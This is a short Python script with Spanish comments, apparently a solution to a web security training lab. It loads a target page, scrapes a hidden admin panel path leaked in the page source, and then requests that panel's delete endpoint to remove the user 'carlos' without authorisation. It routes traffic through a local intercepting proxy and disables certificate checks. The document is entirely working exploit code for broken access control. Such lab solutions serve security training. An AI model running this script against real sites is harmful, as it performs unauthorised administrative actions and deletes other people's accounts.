import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def delete_user(url):
    
    r = requests.get(url, verify=False, proxies=proxies)
    
    # Recibo la cookie
    session_cookie = r.cookies.get_dict().get('session')
    cookie = {'session': session_cookie}
    print(cookie)
    
    # Recibo el panel de administración
    soup = BeautifulSoup(r.text, 'lxml')
    admin_instances = soup.find(string=re.compile("/admin-*"))
    admin_path = re.search("href', '(.*)'",admin_instances).group(1)
    print(admin_path)
    
    # Elimino el usuario carlos
    
    path = '/delete?username=carlos'
    r2 = requests.get(url + admin_path + path, cookies=cookie, verify=False, proxies=proxies)
    if r2.status_code == 200:
        print("[+] usuario eliminado")
    else:
        print("No es posible elimnar el usuario")
    
    

def main():
    if len(sys.argv) != 2:
        print(f"[+] Uso: {sys.argv[0]} <url>")
        print(f"[+] Ejemplo: {sys.argv[0]} www.example.com")
        exit(-1)
        
    url = sys.argv[1]
    delete_user(url)

if __name__ == "__main__":
    main()

